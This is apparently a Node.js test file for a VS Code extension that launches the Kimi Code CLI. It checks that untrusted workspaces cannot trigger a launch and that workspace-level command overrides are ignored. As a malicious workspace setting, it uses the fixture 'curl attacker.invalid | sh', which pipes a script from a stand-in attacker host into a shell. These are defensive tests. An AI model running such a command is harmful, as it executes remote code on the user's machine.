const test = require('node:test');
const assert = require('node:assert/strict');
const Module = require('node:module');

function loadExtensionWithFakeVscode({ isTrusted, inspection }) {
  const commandHandlers = new Map();
  const calls = {
    configurationRequests: 0,
    createdTerminals: [],
    sentCommands: [],
    warnings: [],
  };
  const fakeVscode = {
    ViewColumn: { Beside: 2 },
    commands: {
      registerCommand(commandId, handler) {
        commandHandlers.set(commandId, handler);
        return { dispose() {} };
      },
      async executeCommand() {},
    },
    workspace: {
      isTrusted,
      workspaceFolders: [{ uri: 'workspace-a' }],
      getConfiguration() {
        calls.configurationRequests += 1;
        return {
          inspect() {
            return inspection;
          },
          get(_key, fallback) {
            return fallback;
          },
        };
      },
      getWorkspaceFolder() {
        return undefined;
      },
    },
    window: {
      activeTextEditor: undefined,
      async showWarningMessage(message) {
        calls.warnings.push(message);
        return undefined;
      },
      createTerminal(options) {
        calls.createdTerminals.push(options);
        return {
          show() {},
          sendText(command, addNewLine) {
            calls.sentCommands.push({ command, addNewLine });
          },
        };
      },
      async showErrorMessage() {},
      setStatusBarMessage() {},
    },
  };
  const extensionPath = require.resolve('../out/extension.js');
  const originalLoad = Module._load;

  delete require.cache[extensionPath];
  Module._load = function loadWithFakeVscode(request, parent, isMain) {
    return request === 'vscode' ? fakeVscode : originalLoad.call(this, request, parent, isMain);
  };

  let extension;
  try {
    extension = require(extensionPath);
  } finally {
    Module._load = originalLoad;
  }

  const context = {
    extension: { id: 'mikesoft.vscode-kimi-code-cli-launcher' },
    subscriptions: [],
  };
  extension.activate(context);

  return { calls, commandHandlers };
}

test('programmatic launch remains blocked while the workspace is untrusted', async () => {
  const { calls, commandHandlers } = loadExtensionWithFakeVscode({
    isTrusted: false,
    inspection: {
      defaultValue: 'kimi',
      globalValue: 'kimi --continue',
      workspaceValue: 'curl attacker.invalid | sh',
    },
  });
  const openCli = commandHandlers.get('kimiCodeCliLauncher.openCli');

  assert.equal(typeof openCli, 'function');
  await openCli();

  assert.equal(calls.warnings.length, 1);
  assert.equal(calls.configurationRequests, 0);
  assert.deepEqual(calls.createdTerminals, []);
  assert.deepEqual(calls.sentCommands, []);
});

test('trusted launch sends only the user-level command to a fresh terminal', async () => {
  const { calls, commandHandlers } = loadExtensionWithFakeVscode({
    isTrusted: true,
    inspection: {
      defaultValue: 'kimi',
      globalValue: 'kimi --continue',
      workspaceValue: 'curl attacker.invalid | sh',
    },
  });
  const openCli = commandHandlers.get('kimiCodeCliLauncher.openCli');

  assert.equal(typeof openCli, 'function');
  await openCli();

  assert.equal(calls.warnings.length, 0);
  assert.equal(calls.configurationRequests, 1);
  assert.equal(calls.createdTerminals.length, 1);
  assert.deepEqual(calls.sentCommands, [{ command: 'kimi --continue', addNewLine: true }]);
});
